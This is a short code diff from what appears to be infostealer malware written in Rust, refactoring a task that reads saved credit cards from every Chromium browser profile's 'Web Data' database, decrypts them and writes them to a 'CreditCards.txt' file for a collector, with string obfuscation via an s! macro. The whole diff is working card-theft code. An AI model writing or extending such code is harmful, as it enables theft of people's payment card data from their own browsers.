@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, CreditCard, SqliteDatabase};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
@@ -30,7 +30,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
     parent_name!("CreditCards.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
+        let Some(mut credit_cards) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("Web Data"),
@@ -50,8 +50,8 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
     }
 }
 
-fn extract_card_from_record(
-    record: &dyn TableRecord,
+fn extract_card_from_record<R: TableRecord>(
+    record: &R,
     browser_data: &BrowserData,
 ) -> Option<CreditCard> {
     let name_on_card = record
